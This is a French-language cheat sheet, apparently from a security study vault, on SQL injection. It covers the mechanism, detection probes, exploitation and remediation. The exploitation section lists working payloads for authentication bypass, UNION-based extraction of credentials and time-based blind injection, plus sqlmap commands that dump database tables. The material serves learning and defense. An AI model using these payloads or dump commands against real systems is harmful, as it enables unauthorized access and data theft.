---
tags: [vulnerability, web, injection]
vuln_name: "SQL Injection"
owasp_category: "A03:2021 - Injection"
cvss_score: 9.8
last_updated: 2024-01-01
---

# 🐛 SQL Injection (SQLi)

## 📖 Description

> Injection de code SQL malveillant dans un champ de saisie pour manipuler la base de données sous-jacente. Permet de contourner l'authentification, extraire des données, ou exécuter des commandes.

**OWASP :** A03:2021 — Injection  
**CVSS Score moyen :** 9.8 (Critical)

---

## 🔬 Mécanisme

La requête SQL légitime :
```sql
SELECT * FROM users WHERE username='alice' AND password='1234'
```

Avec injection `' OR 1=1 --` dans le champ username :
```sql
SELECT * FROM users WHERE username='' OR 1=1 --' AND password='1234'
```
→ 1=1 est toujours vrai → retourne tous les users → bypass auth

---

## 🎯 Détection

```
# Test basique — ajouter un ' et observer l'erreur
'
''
`
``
,
"
""
/
//
\
\\
```

Erreurs révélatrices :
- `You have an error in your SQL syntax`
- `Unclosed quotation mark`
- `ORA-01756` (Oracle)

---

## 💥 Exploitation

### Authentication Bypass

```sql
' OR 1=1 --
' OR '1'='1
admin'--
' OR 1=1#
```

### UNION-Based (extraction de données)

```sql
# Trouver le nombre de colonnes
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# Extraire des données
' UNION SELECT username,password FROM users--
```

### Blind SQLi (basé sur le temps)

```sql
# MySQL
'; SELECT SLEEP(5)--
' AND SLEEP(5)--

# MSSQL
'; WAITFOR DELAY '0:0:5'--
```

### Avec SQLMap (automatisé)

```bash
# Test basique
sqlmap -u "http://target.com/page?id=1"

# Dump de la base de données
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D dbname --tables
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Avec cookie de session
sqlmap -u "http://target.com/page" --cookie="SESSID=xxx" --data="id=1"
```

---

## 🛡️ Remédiation

- **Requêtes préparées (paramétrisées)** — séparer les données du code SQL
- **ORM** — utiliser des frameworks qui abstraient les requêtes
- **Validation des entrées** — whitelist des caractères autorisés
- **Principe du moindre privilège** — compte DB avec droits minimaux
- **WAF** — Web Application Firewall comme couche supplémentaire

---

## 🔗 Ressources

- [PortSwigger SQLi Labs](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [HackTricks — SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection)
